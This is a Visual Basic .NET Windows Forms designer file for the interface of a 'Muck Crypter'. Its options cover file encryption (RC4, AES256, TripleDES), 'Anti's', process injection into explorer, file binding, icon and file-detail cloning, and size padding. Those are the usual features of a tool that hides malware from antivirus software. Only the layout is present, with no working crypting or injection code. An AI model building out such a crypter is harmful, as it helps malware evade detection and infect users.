<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class APP
    Inherits System.Windows.Forms.Form

    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    Private components As System.ComponentModel.IContainer

    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(APP))
        Me.TextFile = New System.Windows.Forms.TextBox()
        Me.BtnBrowse = New System.Windows.Forms.Button()
        Me.BtnCtypt = New System.Windows.Forms.Button()
        Me.OpenFileDialog1 = New System.Windows.Forms.OpenFileDialog()
        Me.CheckIcon = New System.Windows.Forms.CheckBox()
        Me.TextIcon = New System.Windows.Forms.TextBox()
        Me.BtnIcon = New System.Windows.Forms.Button()
        Me.CheckClone = New System.Windows.Forms.CheckBox()
        Me.TextClone = New System.Windows.Forms.TextBox()
        Me.BtnClone = New System.Windows.Forms.Button()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.TextEnc = New System.Windows.Forms.TextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.CheckDES = New System.Windows.Forms.RadioButton()
        Me.CheckAES256 = New System.Windows.Forms.RadioButton()
        Me.CheckRC4 = New System.Windows.Forms.RadioButton()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.TextBytes = New System.Windows.Forms.TextBox()
        Me.CheckBytes = New System.Windows.Forms.CheckBox()
        Me.TextProc = New System.Windows.Forms.TextBox()
        Me.CheckInject = New System.Windows.Forms.CheckBox()
        Me.CheckAntis = New System.Windows.Forms.CheckBox()
        Me.GroupBox4 = New System.Windows.Forms.GroupBox()
        Me.BtnBind = New System.Windows.Forms.Button()
        Me.TextBind = New System.Windows.Forms.TextBox()
        Me.CheckBind = New System.Windows.Forms.CheckBox()
        Me.GroupBox1.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        Me.GroupBox4.SuspendLayout()
        Me.SuspendLayout()
        '
        'TextFile
        '
        Me.TextFile.Location = New System.Drawing.Point(27, 53)
        Me.TextFile.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.TextFile.Name = "TextFile"
        Me.TextFile.Size = New System.Drawing.Size(276, 20)
        Me.TextFile.TabIndex = 0
        '
        'BtnBrowse
        '
        Me.BtnBrowse.ForeColor = System.Drawing.Color.Black
        Me.BtnBrowse.Location = New System.Drawing.Point(320, 53)
        Me.BtnBrowse.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.BtnBrowse.Name = "BtnBrowse"
        Me.BtnBrowse.Size = New System.Drawing.Size(55, 20)
        Me.BtnBrowse.TabIndex = 1
        Me.BtnBrowse.Text = "..."
        Me.BtnBrowse.UseVisualStyleBackColor = True
        '
        'BtnCtypt
        '
        Me.BtnCtypt.BackColor = System.Drawing.SystemColors.ActiveCaptionText
        Me.BtnCtypt.Location = New System.Drawing.Point(471, 298)
        Me.BtnCtypt.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.BtnCtypt.Name = "BtnCtypt"
        Me.BtnCtypt.Size = New System.Drawing.Size(300, 50)
        Me.BtnCtypt.TabIndex = 2
        Me.BtnCtypt.Text = "Crypt"
        Me.BtnCtypt.UseVisualStyleBackColor = False
        '
        'OpenFileDialog1
        '
        Me.OpenFileDialog1.FileName = "OpenFileDialog1"
        '
        'CheckIcon
        '
        Me.CheckIcon.AutoSize = True
        Me.CheckIcon.BackColor = System.Drawing.Color.Transparent
        Me.CheckIcon.ForeColor = System.Drawing.Color.Lime
        Me.CheckIcon.Location = New System.Drawing.Point(24, 92)
        Me.CheckIcon.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.CheckIcon.Name = "CheckIcon"
        Me.CheckIcon.Size = New System.Drawing.Size(98, 17)
        Me.CheckIcon.TabIndex = 4
        Me.CheckIcon.Text = "Change Icon"
        Me.CheckIcon.UseVisualStyleBackColor = False
        '
        'TextIcon
        '
        Me.TextIcon.Location = New System.Drawing.Point(23, 115)
        Me.TextIcon.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.TextIcon.Name = "TextIcon"
        Me.TextIcon.Size = New System.Drawing.Size(276, 20)
        Me.TextIcon.TabIndex = 6
        '
        'BtnIcon
        '
        Me.BtnIcon.ForeColor = System.Drawing.Color.Black
        Me.BtnIcon.Location = New System.Drawing.Point(318, 115)
        Me.BtnIcon.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.BtnIcon.Name = "BtnIcon"
        Me.BtnIcon.Size = New System.Drawing.Size(52, 19)
        Me.BtnIcon.TabIndex = 8
        Me.BtnIcon.Text = "..."
        Me.BtnIcon.UseVisualStyleBackColor = True
        '
        'CheckClone
        '
        Me.CheckClone.AutoSize = True
        Me.CheckClone.BackColor = System.Drawing.Color.Transparent
        Me.CheckClone.ForeColor = System.Drawing.Color.Lime
        Me.CheckClone.Location = New System.Drawing.Point(24, 30)
        Me.CheckClone.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.CheckClone.Name = "CheckClone"
        Me.CheckClone.Size = New System.Drawing.Size(106, 17)
        Me.CheckClone.TabIndex = 10
        Me.CheckClone.Text = "Clone with file"
        Me.CheckClone.UseVisualStyleBackColor = False
        '
        'TextClone
        '
        Me.TextClone.Location = New System.Drawing.Point(24, 53)
        Me.TextClone.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.TextClone.Name = "TextClone"
        Me.TextClone.Size = New System.Drawing.Size(272, 20)
        Me.TextClone.TabIndex = 11
        '
        'BtnClone
        '
        Me.BtnClone.ForeColor = System.Drawing.Color.Black
        Me.BtnClone.Location = New System.Drawing.Point(318, 53)
        Me.BtnClone.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.BtnClone.Name = "BtnClone"
        Me.BtnClone.Size = New System.Drawing.Size(54, 19)
        Me.BtnClone.TabIndex = 12
        Me.BtnClone.Text = "..."
        Me.BtnClone.UseVisualStyleBackColor = True
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.BackColor = System.Drawing.Color.Transparent
        Me.Label1.ForeColor = System.Drawing.Color.White
        Me.Label1.Location = New System.Drawing.Point(23, 28)
        Me.Label1.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(82, 13)
        Me.Label1.TabIndex = 13
        Me.Label1.Text = "File to crypt :"
        '
        'TextEnc
        '
        Me.TextEnc.BackColor = System.Drawing.SystemColors.MenuHighlight
        Me.TextEnc.Location = New System.Drawing.Point(140, 53)
        Me.TextEnc.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.TextEnc.Name = "TextEnc"
        Me.TextEnc.Size = New System.Drawing.Size(164, 20)
        Me.TextEnc.TabIndex = 14
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.BackColor = System.Drawing.Color.Transparent
        Me.Label2.ForeColor = System.Drawing.Color.Red
        Me.Label2.Location = New System.Drawing.Point(16, 57)
        Me.Label2.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(99, 13)
        Me.Label2.TabIndex = 15
        Me.Label2.Text = "Encryption key :"
        '
        'GroupBox1
        '
        Me.GroupBox1.BackColor = System.Drawing.Color.Transparent
        Me.GroupBox1.Controls.Add(Me.Label1)
        Me.GroupBox1.Controls.Add(Me.TextFile)
        Me.GroupBox1.Controls.Add(Me.BtnBrowse)
        Me.GroupBox1.ForeColor = System.Drawing.Color.Lime
        Me.GroupBox1.Location = New System.Drawing.Point(14, 3)
        Me.GroupBox1.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Padding = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.GroupBox1.Size = New System.Drawing.Size(391, 91)
        Me.GroupBox1.TabIndex = 18
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "File :"
        '
        'GroupBox2
        '
        Me.GroupBox2.BackColor = System.Drawing.Color.Transparent
        Me.GroupBox2.Controls.Add(Me.CheckDES)
        Me.GroupBox2.Controls.Add(Me.CheckAES256)
        Me.GroupBox2.Controls.Add(Me.CheckRC4)
        Me.GroupBox2.Controls.Add(Me.TextEnc)
        Me.GroupBox2.Controls.Add(Me.Label2)
        Me.GroupBox2.Cursor = System.Windows.Forms.Cursors.Default
        Me.GroupBox2.ForeColor = System.Drawing.Color.Red
        Me.GroupBox2.Location = New System.Drawing.Point(14, 260)
        Me.GroupBox2.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Padding = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.GroupBox2.Size = New System.Drawing.Size(392, 101)
        Me.GroupBox2.TabIndex = 19
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Encryption"
        '
        'CheckDES
        '
        Me.CheckDES.AutoSize = True
        Me.CheckDES.Location = New System.Drawing.Point(140, 21)
        Me.CheckDES.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.CheckDES.Name = "CheckDES"
        Me.CheckDES.Size = New System.Drawing.Size(82, 17)
        Me.CheckDES.TabIndex = 17
        Me.CheckDES.Text = "TripleDES"
        Me.CheckDES.UseVisualStyleBackColor = True
        '
        'CheckAES256
        '
        Me.CheckAES256.AutoSize = True
        Me.CheckAES256.Checked = True
        Me.CheckAES256.Location = New System.Drawing.Point(283, 19)
        Me.CheckAES256.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.CheckAES256.Name = "CheckAES256"
        Me.CheckAES256.Size = New System.Drawing.Size(70, 17)
        Me.CheckAES256.TabIndex = 16
        Me.CheckAES256.TabStop = True
        Me.CheckAES256.Text = "AES256"
        Me.CheckAES256.UseVisualStyleBackColor = True
        '
        'CheckRC4
        '
        Me.CheckRC4.AutoSize = True
        Me.CheckRC4.Checked = True
        Me.CheckRC4.Location = New System.Drawing.Point(20, 23)
        Me.CheckRC4.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.CheckRC4.Name = "CheckRC4"
        Me.CheckRC4.Size = New System.Drawing.Size(49, 17)
        Me.CheckRC4.TabIndex = 15
        Me.CheckRC4.TabStop = True
        Me.CheckRC4.Text = "RC4"
        Me.CheckRC4.UseVisualStyleBackColor = True
        '
        'GroupBox3
        '
        Me.GroupBox3.BackColor = System.Drawing.Color.Transparent
        Me.GroupBox3.Controls.Add(Me.TextBytes)
        Me.GroupBox3.Controls.Add(Me.CheckBytes)
        Me.GroupBox3.Controls.Add(Me.TextProc)
        Me.GroupBox3.Controls.Add(Me.CheckInject)
        Me.GroupBox3.Controls.Add(Me.CheckAntis)
        Me.GroupBox3.ForeColor = System.Drawing.Color.Lime
        Me.GroupBox3.ImeMode = System.Windows.Forms.ImeMode.NoControl
        Me.GroupBox3.Location = New System.Drawing.Point(14, 100)
        Me.GroupBox3.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Padding = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.GroupBox3.Size = New System.Drawing.Size(391, 154)
        Me.GroupBox3.TabIndex = 20
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Others"
        '
        'TextBytes
        '
        Me.TextBytes.Location = New System.Drawing.Point(140, 92)
        Me.TextBytes.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.TextBytes.Name = "TextBytes"
        Me.TextBytes.Size = New System.Drawing.Size(235, 20)
        Me.TextBytes.TabIndex = 4
        Me.TextBytes.Text = "5"
        '
        'CheckBytes
        '
        Me.CheckBytes.AutoSize = True
        Me.CheckBytes.Location = New System.Drawing.Point(22, 91)
        Me.CheckBytes.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.CheckBytes.Name = "CheckBytes"
        Me.CheckBytes.Size = New System.Drawing.Size(110, 17)
        Me.CheckBytes.TabIndex = 3
        Me.CheckBytes.Text = "Add bytes (mb)"
        Me.CheckBytes.UseVisualStyleBackColor = True
        '
        'TextProc
        '
        Me.TextProc.Location = New System.Drawing.Point(205, 56)
        Me.TextProc.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.TextProc.Name = "TextProc"
        Me.TextProc.Size = New System.Drawing.Size(170, 20)
        Me.TextProc.TabIndex = 2
        Me.TextProc.Text = "explorer"
        '
        'CheckInject
        '
        Me.CheckInject.AutoSize = True
        Me.CheckInject.Location = New System.Drawing.Point(22, 56)
        Me.CheckInject.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.CheckInject.Name = "CheckInject"
        Me.CheckInject.Size = New System.Drawing.Size(175, 17)
        Me.CheckInject.TabIndex = 1
        Me.CheckInject.Text = "Custom process injection :"
        Me.CheckInject.UseVisualStyleBackColor = True
        '
        'CheckAntis
        '
        Me.CheckAntis.AutoSize = True
        Me.CheckAntis.Checked = True
        Me.CheckAntis.CheckState = System.Windows.Forms.CheckState.Checked
        Me.CheckAntis.Location = New System.Drawing.Point(22, 19)
        Me.CheckAntis.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.CheckAntis.Name = "CheckAntis"
        Me.CheckAntis.Size = New System.Drawing.Size(100, 17)
        Me.CheckAntis.TabIndex = 0
        Me.CheckAntis.Text = "Enable Anti's"
        Me.CheckAntis.UseVisualStyleBackColor = True
        '
        'GroupBox4
        '
        Me.GroupBox4.BackColor = System.Drawing.Color.Transparent
        Me.GroupBox4.Controls.Add(Me.BtnBind)
        Me.GroupBox4.Controls.Add(Me.TextBind)
        Me.GroupBox4.Controls.Add(Me.CheckBind)
        Me.GroupBox4.Controls.Add(Me.CheckClone)
        Me.GroupBox4.Controls.Add(Me.TextClone)
        Me.GroupBox4.Controls.Add(Me.BtnClone)
        Me.GroupBox4.Controls.Add(Me.BtnIcon)
        Me.GroupBox4.Controls.Add(Me.CheckIcon)
        Me.GroupBox4.Controls.Add(Me.TextIcon)
        Me.GroupBox4.ForeColor = System.Drawing.Color.Lime
        Me.GroupBox4.Location = New System.Drawing.Point(413, 3)
        Me.GroupBox4.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.GroupBox4.Name = "GroupBox4"
        Me.GroupBox4.Padding = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.GroupBox4.Size = New System.Drawing.Size(391, 251)
        Me.GroupBox4.TabIndex = 21
        Me.GroupBox4.TabStop = False
        Me.GroupBox4.Text = "Options"
        '
        'BtnBind
        '
        Me.BtnBind.ForeColor = System.Drawing.Color.Black
        Me.BtnBind.Location = New System.Drawing.Point(317, 180)
        Me.BtnBind.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.BtnBind.Name = "BtnBind"
        Me.BtnBind.Size = New System.Drawing.Size(51, 19)
        Me.BtnBind.TabIndex = 15
        Me.BtnBind.Text = "..."
        Me.BtnBind.UseVisualStyleBackColor = True
        '
        'TextBind
        '
        Me.TextBind.Location = New System.Drawing.Point(23, 179)
        Me.TextBind.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.TextBind.Name = "TextBind"
        Me.TextBind.Size = New System.Drawing.Size(275, 20)
        Me.TextBind.TabIndex = 14
        '
        'CheckBind
        '
        Me.CheckBind.AutoSize = True
        Me.CheckBind.Location = New System.Drawing.Point(24, 156)
        Me.CheckBind.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.CheckBind.Name = "CheckBind"
        Me.CheckBind.Size = New System.Drawing.Size(99, 17)
        Me.CheckBind.TabIndex = 13
        Me.CheckBind.Text = "Bind with file"
        Me.CheckBind.UseVisualStyleBackColor = True
        '
        'APP
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(7.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.SystemColors.ControlText
        Me.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center
        Me.ClientSize = New System.Drawing.Size(825, 410)
        Me.Controls.Add(Me.GroupBox4)
        Me.Controls.Add(Me.GroupBox3)
        Me.Controls.Add(Me.GroupBox2)
        Me.Controls.Add(Me.GroupBox1)
        Me.Controls.Add(Me.BtnCtypt)
        Me.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(162, Byte))
        Me.ForeColor = System.Drawing.Color.Red
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Margin = New System.Windows.Forms.Padding(4, 3, 4, 3)
        Me.Name = "APP"
        Me.Text = "Muck Crypter by unknown"
        Me.TransparencyKey = System.Drawing.Color.Blue
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        Me.GroupBox4.ResumeLayout(False)
        Me.GroupBox4.PerformLayout()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents TextFile As System.Windows.Forms.TextBox
    Friend WithEvents BtnBrowse As System.Windows.Forms.Button
    Friend WithEvents BtnCtypt As System.Windows.Forms.Button
    Friend WithEvents OpenFileDialog1 As System.Windows.Forms.OpenFileDialog
    Friend WithEvents CheckIcon As System.Windows.Forms.CheckBox
    Friend WithEvents TextIcon As System.Windows.Forms.TextBox
    Friend WithEvents BtnIcon As System.Windows.Forms.Button
    Friend WithEvents CheckClone As System.Windows.Forms.CheckBox
    Friend WithEvents TextClone As System.Windows.Forms.TextBox
    Friend WithEvents BtnClone As System.Windows.Forms.Button
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents TextEnc As System.Windows.Forms.TextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents CheckDES As System.Windows.Forms.RadioButton
    Friend WithEvents CheckAES256 As System.Windows.Forms.RadioButton
    Friend WithEvents CheckRC4 As System.Windows.Forms.RadioButton
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents CheckAntis As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox4 As System.Windows.Forms.GroupBox
    Friend WithEvents BtnBind As System.Windows.Forms.Button
    Friend WithEvents TextBind As System.Windows.Forms.TextBox
    Friend WithEvents CheckBind As System.Windows.Forms.CheckBox
    Friend WithEvents TextProc As System.Windows.Forms.TextBox
    Friend WithEvents CheckInject As System.Windows.Forms.CheckBox
    Friend WithEvents TextBytes As System.Windows.Forms.TextBox
    Friend WithEvents CheckBytes As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox2 As GroupBox
End Class
